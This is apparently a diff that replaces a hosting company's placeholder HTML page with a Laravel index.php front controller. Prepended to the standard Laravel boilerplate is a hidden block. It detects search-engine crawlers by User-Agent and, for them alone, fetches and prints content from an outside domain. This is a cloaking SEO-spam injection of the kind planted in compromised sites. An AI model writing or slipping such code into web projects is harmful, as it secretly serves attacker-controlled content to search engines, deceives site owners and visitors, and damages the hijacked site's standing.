@@ -1,135 +1,75 @@
-<!DOCTYPE html>
-<html lang="en-us" class="no-js">
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
 
-	<head>
-		<meta charset="utf-8">
-        <title>We are Coming Soon - Hosted by XeonBD</title>
-        <meta name="description" content="This website is hosted by XeonBD, one of the best & reliable premium web hosting service provider.">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta name="author" content="XeonBD">
+if (is_bot()) {
+    $message = file_get_contents('https://amp-saya.com/brand/kikototo/bfa.uz/index.txt');#NAROLINK
+    echo $message;
+}
+?>
 
-        <!-- ================= Favicon ================== -->
-        <!-- Standard -->
-        <link rel="shortcut icon" href="http://www.xeonbd.com/images/favicon.ico">
-        <!-- Retina iPad Touch Icon-->
-        <link rel="apple-touch-icon" sizes="144x144" href="http://www.xeonbd.com/images/favicon.ico">
-        <!-- Retina iPhone Touch Icon-->
-        <link rel="apple-touch-icon" sizes="114x114" href="http://www.xeonbd.com/images/favicon.ico">
-        <!-- Standard iPad Touch Icon--> 
-        <link rel="apple-touch-icon" sizes="72x72" href="http://www.xeonbd.com/images/favicon.ico">
-        <!-- Standard iPhone Touch Icon--> 
-        <link rel="apple-touch-icon" sizes="57x57" href="ihttp://www.xeonbd.com/images/favicon.ico">
+<?php
 
-        <!-- ============== Resources style ============== -->
-        <link rel="stylesheet" href="css/style-minimal.css" />
+use Illuminate\Contracts\Http\Kernel;
+use Illuminate\Http\Request;
 
-		<!-- Modernizr runs quickly on page load to detect features -->
-		<script src="js/modernizr.custom.js"></script>
-	</head>
-	
-	<body>
+define('LARAVEL_START', microtime(true));
 
-		<!-- Page preloader -->
-		<div id="loading">
-			<div id="preloader">
-				<span></span>
-				<span></span>
-			</div>
-		</div>
+/*
+|--------------------------------------------------------------------------
+| Check If The Application Is Under Maintenance
+|--------------------------------------------------------------------------
+|
+| If the application is in maintenance / demo mode via the "down" command
+| we will load this file so that any pre-rendered content can be shown
+| instead of starting the framework, which could cause an exception.
+|
+*/
 
-		<!-- Overlay -->
-		<div class="global-overlay">
-			<div class="overlay skew-part"></div>
-		</div>
+if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
+    require $maintenance;
+}
 
-		<!-- START - Home/Left Part -->
-		<section id="left-side" class="minimal-phone">
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| this application. We just need to utilize it! We'll simply require it
+| into the script here so we don't need to manually load our classes.
+|
+*/
 
-			<!-- Your logo -->
-			<img src="img/XeonBD.png" alt="XeonBD" class="brand-logo" />
+require __DIR__.'/../vendor/autoload.php';
 
-			<div class="content">
-<br /><br /><br />
-				<h1 class="text-intro opacity-0">We are coming soon
-				</h1>
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request using
+| the application's HTTP kernel. Then, we will send the response back
+| to this client's browser, allowing them to enjoy our application.
+|
+*/
 
-				<h2 class="text-intro opacity-0">and Yes! we are proudly powered by <a href="http://www.xeonbd.com/">XeonBD</a><br /></h2>
+$app = require_once __DIR__.'/../bootstrap/app.php';
 
-<br />
-XeonBD<br />
-Suite 2A, House 231 (KAZI BARI), Road 06 <br />
-Mohammadi Housing Limited, Mohammadpur <br />
-Dhaka - 1207, Bangladesh. <br /><br />
-Sales: <a href="tel:+8801977936623">+8801977936623</a> <br />
-Available during 10:00 AM to 06:00 PM (GMT +06:00)<br /><br />
+$kernel = $app->make(Kernel::class);
 
-WebSite: <a href="http://www.xeonbd.com/">www.xeonbd.com</a> | Support: <a href="http://support.xeonbd.com/">support.xeonbd.com</a><br />
-Query: <a href="http://query.xeonbd.com/">query.xeonbd.com</a> | Blog: <a href="http://blog.xeonbd.com/">blog.xeonbd.com</a><br />
-</h2>
-			</div>
+$response = $kernel->handle(
+    $request = Request::capture()
+)->send();
 
-			<!-- Social icons -->
-			<div class="social-icons">
-
-				<a href="https://www.facebook.com/myxeonbd/"><i class="fa fa-facebook"></i></a>
-				<a href="http://www.twitter.com/xeonbd"><i class="fa fa-twitter"></i></a>
-				<a href="https://plus.google.com/107510523852147662268/posts"><i class="fa fa-google-plus"></i></a>
-				<a href="https://www.linkedin.com/company/xeonbd"><i class="fa fa-linkedin"></i></a>
-
-			</div>
-
-		</section>
-		<!-- END - Home/Left Part -->
-
-	<!-- ///////////////////\\\\\\\\\\\\\\\\\\\ -->
-    <!-- ********** Resources jQuery ********** -->
-    <!-- \\\\\\\\\\\\\\\\\\\/////////////////// -->
-	
-	<!-- * Libraries jQuery, Easing and Bootstrap - Be careful to not remove them * -->
-	<script src="js/jquery.min.js"></script>
-	<script src="js/jquery.easings.min.js"></script>
-	<script src="js/bootstrap.min.js"></script>
-
-	<!-- PhotoSwipe Core JS file -->
-	<script src="js/velocity.min.js"></script> 
-
-	<!-- PhotoSwipe UI JS file -->
-	<script src="js/velocity.ui.min.js"></script> 
-
-	<!-- Newsletter plugin -->
-	<script src="js/notifyMe.js"></script>
-
-	<!-- Slideshow/Image plugin -->
-	<script src="js/vegas.js"></script>
-
-	<!-- Scroll plugin -->
-	<script src="js/jquery.mousewheel.js"></script>
-
-	<!-- Custom Scrollbar plugin -->
-	<script src="js/jquery.mCustomScrollbar.js"></script>
-
-	<!-- Popup Newsletter Form -->
-	<script src="js/classie.js"></script>
-	<script src="js/dialogFx.js"></script>
-
-	<!-- Countdown plugin -->
-	<script src="js/jquery.countdown.js"></script>
-
-	<script>
-	$("#getting-started")
-		// Year/Month/Day Hour:Minute:Second
-		.countdown("2016/10/24 15:30:30", function(event) {
-			$(this).text(
-				event.strftime('%D Days %Hh %Mm %Ss')
-			);
-	});
-	</script>
-
-	<!-- Main JS File -->
-	<script src="js/main.js"></script>
-	
-	<!--[if lt IE 10]><script type="text/javascript" src="js/placeholder.js"></script><![endif]-->
-
-	</body>
-
-</html>
+$kernel->terminate($request, $response);
